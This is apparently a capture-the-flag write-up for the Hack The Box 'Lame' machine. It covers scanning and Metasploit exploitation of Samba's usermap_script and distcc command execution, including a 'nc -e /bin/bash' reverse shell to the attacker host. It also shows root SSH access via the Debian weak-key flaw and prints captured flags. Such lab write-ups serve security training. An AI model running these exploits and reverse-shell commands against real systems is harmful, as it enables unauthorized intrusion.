![[Pasted image 20250824023427.png]]


| Machine Name         | Lame      |
| -------------------- | --------- |
| **Difficulty Level** | **Easy**  |
| **Operating System** | **Linux** |

---

**Scanning (Nmap Scan) :**

1. **Basic Scan:**

```
# Nmap 7.95 scan initiated Sun Aug 24 02:45:20 2025 as: /usr/lib/nmap/nmap --privileged -p-65535 --min-rate=5000 -oN basic_scan.txt 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.35s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

# Nmap done at Sun Aug 24 02:45:48 2025 -- 1 IP address (1 host up) scanned in 28.23 seconds
```

**2. Aggressive scan:**

- -sC -> Nmap NSE scripts.
- -sV -> probe open ports to determine service versions.
- -Pn -> Skip Host discovery (Treat targets as up).
- -A -> Agressive mode (enables OS detection, version detection, default scripts, and traceroute).

```
# Nmap 7.95 scan initiated Sun Aug 24 04:07:40 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -A -p-65535 --min-rate=5000 -oN scan.txt 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.32s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (91%), Arris TG562G/CT cable modem (90%), Dell Integrated Remote Access Controller (iDRAC5) (90%), Dell Integrated Remote Access Controller (iDRAC6) (90), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2..18) (90%), Linux 2.6.18 (90%), Linux 2.6.8 - 2.6.30 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-08-23T18:39:06-04:00
|_clock-skew: mean: 2h00m25s, deviation: 2h49m44s, median: 23s

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   321.66 ms 10.10.14.1
2   322.28 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 24 04:09:22 2025 -- 1 IP address (1 host up) scanned in 101.31 seconds

```

- So From here we have found attack vectors these are :
```	
	- Port 21  : FTP
	- Port 22  : SSH
	- Port 445 : SMB
	- Port 3632: distccd
```

---

## Enumeration and Exploitation:

### Port 21(FTP) :

**Anonymous Login :**

- Here FTP has  anonymous login enabled allowing a malicious user to login user "anonymous" username and "no_password".

```
FTP has Anonymous Login Enabled:

┌──(kamikaze㉿kamikaze)-[~/…/share/Trash/files/Lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kamikaze): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44189|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> dir
229 Entering Extended Passive Mode (|||14650|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> dir 
229 Entering Extended Passive Mode (|||58683|).
150 Here comes the directory listing.
226 Directory send OK.

```

- We are successfully able to login but there are no directory found. as in FTP we owner has given permission to the user so there are no permission for "anonymous" user here in this box.

**Search Exploit for VSFTPD 2.3.4**:

```
- Here we have VSFTP server with version 2.3.4 , lets try to find exploit for this :
  
┌──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ searchsploit vsftpd 2.3.4 
----------------------------------------------------------------------------------------------------------------------------- ----------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ----------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                       | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------- ----------------------
Shellcodes: No Results
```

```
- Now, using metaspolit exploiting the vulnerability in the VSFTPD 2.3.4
  
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

```

```
- Now we are going to exploit this service using the exploit present in metasploit.

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

- There may be firewall present at the backend which are blocking our request. 
```

### Port 22(SSH):

```
┌──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ searchsploit OpenSSH 4.7p1
--------------------------------------------------------------------------------------------------------------------- ------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                       | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                         | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                               | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                 | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                             | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                 | linux/remote/45939.py
--------------------------------------------------------------------------------------------------------------------- ------------------------------
Shellcodes: No Results

- Here there is no exploit found for OpenSSH 4.7p1

```

### Port 445(SMB):

**SMB Anonymous Login**:

```
──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ smbmap -H 10.10.10.3
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS        Printer Drivers
        tmp                                                     READ, WRITE      oh noes!
        opt                                                     NO ACCESS        
        IPC$                                                    NO ACCESS        IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS        IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connections                                                                                                     

```

```
┌──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ smbclient -N //10.10.10.3/tmp
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Aug 24 04:34:26 2025
  ..                                 DR        0  Sat Oct 31 12:03:58 2020
  .ICE-unix                          DH        0  Sun Aug 24 01:36:03 2025
  vmware-root                        DR        0  Sun Aug 24 01:38:59 2025
  .X11-unix                          DH        0  Sun Aug 24 01:36:31 2025
  .X0-lock                           HR       11  Sun Aug 24 01:36:31 2025
  5541.jsvc_up                        R        0  Sun Aug 24 01:37:08 2025
  vgauthsvclog.txt.0                  R     1600  Sun Aug 24 01:36:01 2025
  
- There us nothing interesting here
```

**Search Exploit for Samba smbd 3.0.20**

```
┌──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ searchsploit samba 3.0.20           
----------------------------------------------------------------------------------------------------------------------- ----------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ----------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                 | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                       | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                  | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                          | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------------------- ----------------------------
Shellcodes: No Results
```

```
- Now using the exploit Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) to exploit .
  
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.209.135  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.14.13
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.3:59844) at 2025-08-24 04:42:47 +0530

```

### Port 3632(distcc)

- > [Distcc](https://github.com/distcc/distcc) is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, **distccd**, and a client program, **distcc**. Distcc can work transparently with [ccache](http://ccache.samba.org), [Portage](https://wiki.gentoo.org/wiki/Portage), and Automake with a small amount of setup.
- Anyone who can connect to the distccd server port can run arbitrary commands on that machine as the distccd user.

**Search Exploit for distccd v1 ((GNU) 4.2.4**:

```
┌──(kamikaze㉿kamikaze)-[~/…/Trash/files/Lame/scan]
└─$ searchsploit distcc 
----------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- -------------------------
DistCC Daemon - Command Execution (Metasploit)                                                                            | multiple/remote/9915.rb
----------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

- This isn’t as much an exploit as it is taking advantage of what is called out on the Gentoo wiki - part of the system design is such that if you can connect to distcc, you can run commands.
- Goolging shows some ties to CVE-2004-2687, but pulling up the [documentation on that CVE](https://nvd.nist.gov/vuln/detail/CVE-2004-2687), it’s exactly what I saw above:

```
distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.
```

- nmap Script:
```
Searching on the CVE leads to not only the Metasploit exploit, but also [this nmap script](https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse). It’s not a script included with `nmap` by default, but I can download it and store it in my scripts directory. `locate` is useful to find where the scripts are stored:

┌──(kamikaze㉿kamikaze)-[~/Downloads]
└─$ nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 01:34 IST
Nmap scan report for 10.10.10.3
Host is up (0.26s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds

```

- The script above actually already showed command execution, running and returning the results from the `id` command. I can see the process is running as daemon.
To get a shell, I’ll just start a `nc` listener, and change that command from `id` to `nc`:

```
┌──(kamikaze㉿kamikaze)-[~/Downloads]
└─$ nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/bash 10.10.14.13 443'"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 01:36 IST
Nmap scan report for 10.10.10.3
Host is up (0.26s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 30.97 seconds
```

- Instantly I get a shell:

```
┌──(kamikaze㉿kamikaze)-[~/Downloads]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.3] 52208
ls
5544.jsvc_up
distcc_150070d3.stderr
distcc_152770d3.stdout
distccd_49d470d3.o
distccd_4e3c70d3.i
vgauthsvclog.txt.0
vmware-root
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
whoami
daemon
```


---
## Final Step

### Getting the Flags (Easy way)

```FTP
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Command shell session 2 opened (10.10.14.13:4444 -> 10.10.10.3:59845) at 2025-08-24 04:44:24 +0530

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
whoami
root
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
49c3324feead4db5b8ff13816517a4cb
cd ..
cd home 
cd user 
ls
cd ..
ls
ftp
makis
service
user
cd makis
ls    
user.txt
cat user.txt
e243f4e35bffd18464e947080efd9aaf
```

### Getting Shell (Hard way ):

I'll upgrade it with `python -c 'import pty;pty.spawn("bash")'`. I can grab `user.txt`:

```
┌──(kamikaze㉿kamikaze)-[~/Downloads]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.3] 52024
python -c 'import pty;pty.spawn("bash")'
daemon@lame:/tmp$ ls
ls
c5544.jsvc_up           distcc_fbef72cd.stderr  distccd_8034727e.o
distcc_bc86727d.stderr  distccd_6f8b72cd.o      vgauthsvclog.txt.0
distcc_bcaa727d.stdout  distccd_6ff372cd.i      vmware-root
distcc_fb8a72cd.stdout  distccd_8015727e.i
daemon@lame:/$ cd home  
ckd home
daemon@lame:/home$ls
ls
ftp  makis  service  user
daemon@lame:/home$ cd makis
cd makis
daemon@lame:/home/makis$ ls
ls
user.txt
daemon@lame:/home/makis$ cat user.txt
cat user.txt
b495ce681268c527c10b95d6e65020af

```

#### Getting Shell as Root (By checking file permission)

- weak SSH (The permissions on `/root` are open to make it world readable):
```
daemon@lame:/$ ls -ld root/
ls -ld root/
drwxr-xr-x 13 root root 4096 Aug 24 16:00 root/

```

- I can’t read `root.txt`, but I can read into the `.ssh` directory:

```
daemon@lame:/$ cd root/
cd root/
daemon@lame:/root$ ls -la
ls -la
total 80
drwxr-xr-x 13 root root 4096 Aug 24 16:00 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Aug 24 16:00 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Aug 24 16:00 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Aug 24 16:00 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Aug 24 16:00 root.txt
-rw-r--r--  1 root root  118 Aug 24 16:00 vnc.log
daemon@lame:/root$ cd .ssh
cd .ssh/
daemon@lame:/root/.ssh$ ls
ls
authorized_keys  known_hosts
daemon@lame:/root/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
daemon@lame:/root/.ssh$ 

```

- Typically having a public key doesn’t do much, but two things are interesting here:
	- Why is the user msfadmin@metasploitable?
	- Could this key be vulnerable to CVE-2008-0166, where the random number generator in OpenSSL broke for a period of time causing lots of thing, including some SSH keys, to be brute forcable from the public key.

- I’ll clone [g0tmi1k’s GitHub repo](https://github.com/g0tmi1k/debian-ssh) for this vulnerability, and go into that directory, and unpack the common RSA keys:

```
┌──(kamikaze㉿kamikaze)-[~/…/HTB/HTB/Lame/debian-ssh]
└─$ cd common_keys                                                                    
┌──(kamikaze㉿kamikaze)-[~/…/HTB/Lame/debian-ssh/common_keys]
└─$ cd rsa/2048                                                                        
┌──(kamikaze㉿kamikaze)-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub
57c3115d77c56390332dc5c49978627a-5429.pub
```

- I can use the matching private key to SSH to the box as root:

```
┌──(kamikaze㉿kamikaze)-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3                                                            
Unable to negotiate with 10.10.10.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

- This happens because your local SSH client refuses the host key algorithms offered by the server (only ssh-rsa and ssh-dss), as modern OpenSSH defaults disable SHA-1–based rsa-sha1 and always disable the insecure DSS (ssh-dss).

```
Quick fixes (one-off commands)
Allow SHA-1 RSA host key just for this connection
OpenSSH 8.8+:

Try rsa-sha2 first, then fall back to SHA-1 hostkey if necessary:
Preferred:

ssh -i 57c3115d77c56390332dc5c49978627a-5429 -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.10.3

If the server is extremely old and also needs SHA-1 signatures for auth, the PubkeyAcceptedAlgorithms tweak helps accept an rsa-sha1 signature for your key.

If you still get failures, add:

-oKexAlgorithms=+diffie-hellman-group14-sha1 -oCiphers=+aes128-cbc

only if subsequent errors complain about KEX or ciphers. Use these as last resort because they enable legacy primitives.
If your client is older than 8.8 (where ssh-rsa may still be enabled but not preferred), the above options still work and are explicit.
```

- when try to run this command :

```
ssh -i 57c3115d77c56390332dc5c49978627a-5429 -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.10.3 

- On running this command with normal user getting this error:
  
┌──(kamikaze㉿kamikaze)-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ ssh -i 57c3115d77c56390332dc5c49978627a-5429 -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.10.3     
Load key "57c3115d77c56390332dc5c49978627a-5429": Permission denied
root@10.10.10.3's password: 
Permission denied, please try again.
root@10.10.10.3's password: 
```

- Reslove -> run the command with `sudo(superuser)`:

```
┌──(kamikaze㉿kamikaze)-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ sudo ssh -i 57c3115d77c56390332dc5c49978627a-5429 -oHostKeyAlgorithms=ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.10.10.3
Last login: Sun Aug 24 17:06:54 2025 from 10.10.14.13
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# id
uid=0(root) gid=0(root) groups=0(root)
root@lame:~# ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:~# ls -la
total 80
drwxr-xr-x 13 root root 4096 2025-08-24 16:00 .
drwxr-xr-x 21 root root 4096 2020-10-31 02:33 ..
lrwxrwxrwx  1 root root    9 2012-05-14 00:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 2007-10-20 07:51 .bashrc
drwx------  3 root root 4096 2012-05-20 15:08 .config
drwxr-xr-x  2 root root 4096 2012-05-20 15:08 Desktop
drwx------  2 root root 4096 2012-05-20 15:13 .filezilla
drwxr-xr-x  5 root root 4096 2025-08-24 16:00 .fluxbox
drwx------  2 root root 4096 2012-05-20 15:38 .gconf
drwx------  2 root root 4096 2012-05-20 15:40 .gconfd
drwxr-xr-x  2 root root 4096 2012-05-20 15:09 .gstreamer-0.10
drwx------  4 root root 4096 2012-05-20 15:07 .mozilla
-rw-r--r--  1 root root  141 2007-10-20 07:51 .profile
drwx------  5 root root 4096 2012-05-20 15:11 .purple
-rwx------  1 root root  401 2012-05-20 15:55 reset_logs.sh
-rwx------  1 root root    4 2012-05-20 14:25 .rhosts
-rw-------  1 root root   33 2025-08-24 16:00 root.txt
drwxr-xr-x  2 root root 4096 2012-05-20 14:21 .ssh
drwx------  2 root root 4096 2025-08-24 16:00 .vnc
-rw-r--r--  1 root root  118 2025-08-24 16:00 vnc.log
-rw-------  1 root root  373 2025-08-24 16:00 .Xauthority
root@lame:~# cat root.txt
b86da88c1767c90c2a1274f60f8e7a3a

```

### Getting Shell as Root (By SUID):

**Enumeration :**

- I can look for SUID files with the following `find` command (LinEnum or linPEAS would also find them):

```

```
  
  


